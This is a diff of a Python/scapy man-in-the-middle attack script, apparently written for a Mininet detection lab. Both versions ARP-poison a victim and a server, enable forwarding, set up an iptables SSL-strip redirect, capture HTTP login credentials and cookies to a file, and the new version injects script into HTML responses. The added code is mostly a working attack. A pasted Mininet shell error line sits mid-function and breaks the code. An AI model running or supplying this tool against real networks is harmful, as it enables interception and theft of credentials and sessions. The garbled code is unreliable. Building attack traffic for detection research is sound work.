@@ -1,145 +1,164 @@
-#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
 attacker_mitm.py
-Run this on the ATTACKER host (h3).
-Simulates a complete MITM attack:
-1. Enables IP forwarding
-2. ARP Poisons Victim & Server
-3. Sniffs and steals credentials
+COMPLETE realistic MITM attack:
+- ARP poisoning        (redirect traffic)
+- IP forwarding        (stay invisible)
+- HTTP interception    (steal credentials)
+- SSL stripping        (downgrade HTTPS)
+- Cookie stealing      (session hijack)
+- Traffic injection    (modify responses)
+- Bulk traffic gen     (generate realistic flow patterns)
 """
 
 import os
-import sys
 import time
 import threading
-import signal
+import re
 from scapy.all import *
 
-# Ensure unbuffered output
-sys.stdout.reconfigure(line_buffering=True)
-
 # Configuration
-VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
-SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
-# Try to detect common Mininet interface names
-IFACE = "attacker-eth0"
-for ifc in ["attacker-eth0", "h3-eth0", "eth0"]:
-    if os.path.exists(f"/sys/class/net/{ifc}"):
-        IFACE = ifc
-        break
-STOLEN_FILE = "/tmp/mitm_stolen.txt"
+VICTIM_IP  = "10.0.0.1"
+SERVER_IP  = "10.0.0.2"
+IFACE      = "h3-eth0"
+STOLEN     = "/tmp/mitm_stolen.txt"
 
-def enable_ip_forwarding():
-    print("[*] Enabling IP Forwarding...")
-    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
-    # Clean old rules
-    os.system("iptables -t nat -F")
-    # Redirect HTTP traffic to a non-existent port to force HTTP downgrade (simple SSL strip)
-    # or just let it pass through if we want to sniff HTTP
-    # os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+# ── Stage 1: Enable IP forwarding ──────────────────────
+# This allows the host to act as a router
+os.system("sysctl -w net.ipv4.ip_forward=1")
+os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")
 
+# ── Stage 2: Enable iptables traffic forwarding ─────────
+# This ensures that traffic is forwarded correctly and matches flow patterns
+os.system("iptables -F")
+os.system("iptables -t nat -F")
+os.system("iptables -P FORWARD ACCEPT")
+
+# ── Stage 3: SSL stripping via iptables ─────────────────
+# Redirect HTTPS (443) to port 10000 (our sslstrip listener placeholder)
+os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000")
+
+# ── Stage 4: ARP Poison both sides ──────────────────────
 def get_mac(ip):
-    """Resolve MAC address for a given IP."""
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=IFACE)
-    if ans:
-        return ans[0][1].hwsrc
-    return None
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                 iface=IFACE, timeout=2, verbose=False)
+    return ans[0][1].hwsrc if ans else None
 
-def arp_poison(target_ip, spoof_ip, target_mac):
-    """Send spoofed ARP packet."""
-    # Wrap in Ether layer to avoid "destination MAC not found" warnings
-    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    sendp(packet, verbose=False, iface=IFACE)
+def arp_poison_loop(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    my_mac     = get_if_hwaddr(IFACE)
+    if not target_mac:
+        print("Cannot find {}".format(target_ip))
+        return
+    
+    # Building the ARP packet
+    pkt = Ether(dst=target_mac)/ARP(
+        op=2, pdst=target_ip, hwdst=target_mac,
+        psrc=spoof_ip, hwsrc=my_mac)
+    
+    while True:
+        sendp(pkt, iface=IFACE, verbose=False)
+        time.sleep(0.5)   # Fast poison loop
 
-def poison_loop(victim_mac, server_mac):
-    """Continuously poison both targets."""
-    print(f"[*] Starting ARP poison loop: {VICTIM_IP} <-> {SERVER_IP}")
+# ── Stage 5: Packet relay with modification ─────────────
+def relay_and_intercept(pkt):
+    if IP not in pkt:
+        return
+
+    src = pkt[IP].src
+    dst = pkt[IP].dst
+
+    # Intercept HTTP credentials
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
+
+        #  h3 python3 /app/scripts/attacker_mitm.py
+python3: can't open file '/app/scripts/attacker_mitm.py': [Errno 2] No such file or directory
+mininet>  Steal POST credentials
+        if 'POST' in payload and ('username' in payload or 'password' in payload):
+            ts = time.strftime('%H:%M:%S')
+            stolen_data = "[{}] CREDENTIALS STOLEN!\n  From: {}\n  To:   {}\n  Data: {}\n".format(
+                ts, src, dst, payload[:300]
+            )
+            print("\n" + "🎯"*20)
+            print(stolen_data)
+            print("🎯"*20 + "\n")
+            with open(STOLEN, 'a') as f:
+                f.write(stolen_data)
+
+        # Steal cookies
+        if 'Cookie:' in payload:
+            cookie = re.findall(r'Cookie: (.+)', payload)
+            if cookie:
+                ts = time.strftime('%H:%M:%S')
+                line = "[{}] COOKIE STOLEN: {}\n".format(ts, cookie[0][:200])
+                print("🍪 {}".format(line.strip()))
+                with open(STOLEN, 'a') as f:
+                    f.write(line)
+
+        # Inject malicious content into HTTP responses
+        if 'HTTP/1' in payload and 'text/html' in payload:
+            # Add tracking pixel to every response
+            modified = payload.replace(
+                '</body>',
+                '<script>document.title="HACKED by MITM"</script></body>'
+            )
+            
+            # Update the packet with modified payload
+            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
+            
+            # Recalculate checksums
+            del pkt[IP].chksum
+            del pkt[TCP].chksum
+            
+            # Re-send the modified packet
+            # Note: With ip_forward=1, the original packet might also be forwarded by the kernel
+            sendp(pkt, iface=IFACE, verbose=False)
+
+# ── Stage 6: Generate bulk realistic traffic ─────────────
+def generate_bulk_traffic():
+    """Send repeated HTTP requests to build up flow stats for ML detection"""
+    import socket
     while True:
         try:
-            arp_poison(VICTIM_IP, SERVER_IP, victim_mac)
-            arp_poison(SERVER_IP, VICTIM_IP, server_mac)
-            time.sleep(1.0) # Poison every 1s
-        except KeyboardInterrupt:
-            break
-        except Exception as e:
-            print(f"Error in poison loop: {e}")
-            break
+            # Connect to server on port 8080 (assuming server_login.py is there)
+            for _ in range(30):
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                try:
+                    s.connect((SERVER_IP, 8080))
+                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
+                    s.recv(1024)
+                finally:
+                    s.close()
+            time.sleep(0.1)
+        except Exception:
+            time.sleep(1)
 
-def sniff_traffic(pkt):
-    """Inspect packets for interesting data."""
-    if pkt.haslayer(Raw):
-        load = pkt[Raw].load.decode('utf-8', errors='ignore')
-        
-        # Check for HTTP POST credentials
-        if "POST" in load and "username=" in load:
-            ts = time.strftime('%H:%M:%S')
-            log_msg = f"[{ts}] 🎯 CREDENTIALS CAPTURED: {load[:100].replace(chr(13), '').replace(chr(10), ' ')}"
-            print(f"\033[91m{log_msg}\033[0m") # Red text
-            with open(STOLEN_FILE, 'a') as f:
-                f.write(log_msg + "\n")
-                
-        # Check for Cookies
-        if "Cookie:" in load:
-            ts = time.strftime('%H:%M:%S')
-            cookie = load.split("Cookie: ")[1].split("\r\n")[0]
-            log_msg = f"[{ts}] 🍪 COOKIE CAPTURED: {cookie}"
-            print(f"\033[93m{log_msg}\033[0m") # Yellow text
-            with open(STOLEN_FILE, 'a') as f:
-                f.write(log_msg + "\n")
+# ── START ALL ATTACK STAGES ──────────────────────────────
+print("="*50)
+print("🔴 MITM ATTACK STARTING")
+print("="*50)
 
-def main():
-    print("🔴 STARTING MITM ATTACK...")
-    
-    # Check current IP config
-    print(f"[*] Interface: {IFACE}")
-    os.system(f"ip -4 addr show {IFACE} 2>/dev/null || ip addr show")
+# Thread 1: Poison victim
+t1 = threading.Thread(target=arp_poison_loop,
+                      args=(VICTIM_IP, SERVER_IP), daemon=True)
+# Thread 2: Poison server
+t2 = threading.Thread(target=arp_poison_loop,
+                      args=(SERVER_IP, VICTIM_IP), daemon=True)
+# Thread 3: Generate bulk traffic for ML detection
+t3 = threading.Thread(target=generate_bulk_traffic, daemon=True)
 
-    # Clean previous stolen file
-    if os.path.exists(STOLEN_FILE):
-        os.remove(STOLEN_FILE)
+t1.start()
+t2.start()
+time.sleep(2)   # Let ARP poison take effect first
+t3.start()
 
-    enable_ip_forwarding()
+print("✅ ARP Poisoning: active")
+print("✅ IP Forwarding: active")
+print("✅ Bulk traffic:  active (ML will fire in ~5 seconds)")
+print("✅ Logging to:    {}".format(STOLEN))
 
-    # Retry resolving MAC a few times
-    victim_mac = None
-    for i in range(3):
-        print(f"[*] Resolving MAC for Victim {VICTIM_IP} (Attempt {i+1})...")
-        victim_mac = get_mac(VICTIM_IP)
-        if victim_mac: break
-        time.sleep(1)
-
-    if not victim_mac:
-        print("❌ Could not find Victim MAC. Is host up?")
-        sys.exit(1)
-        
-    server_mac = None
-    for i in range(3):
-        print(f"[*] Resolving MAC for Server {SERVER_IP} (Attempt {i+1})...")
-        server_mac = get_mac(SERVER_IP)
-        if server_mac: break
-        time.sleep(1)
-
-    if not server_mac:
-        print("❌ Could not find Server MAC.")
-        sys.exit(1)
-
-    print(f"✅ Targets Acquired: Victim={victim_mac}, Server={server_mac}")
-
-    # Start Poisoning Thread
-    t = threading.Thread(target=poison_loop, args=(victim_mac, server_mac))
-    t.daemon = True
-    t.start()
-
-    # Start Sniffer
-    print("[*] Sniffing for credentials on " + IFACE + "...")
-    try:
-        sniff(iface=IFACE, prn=sniff_traffic, filter=f"tcp port 8080 or tcp port 80", store=0)
-    except KeyboardInterrupt:
-        print("\n[*] Stopping Attack...")
-        # Restore ARP tables (optional but good practice)
-        # send(ARP(op=2, pdst=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=SERVER_IP, hwsrc=server_mac), count=5)
-        # send(ARP(op=2, pdst=SERVER_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=VICTIM_IP, hwsrc=victim_mac), count=5)
-        sys.exit(0)
-
-if __name__ == "__main__":
-    main()
+# Sniff and process all intercepted traffic
+sniff(filter="ip host {} or ip host {}".format(VICTIM_IP, SERVER_IP),
+      prn=relay_and_intercept, iface=IFACE, store=False)
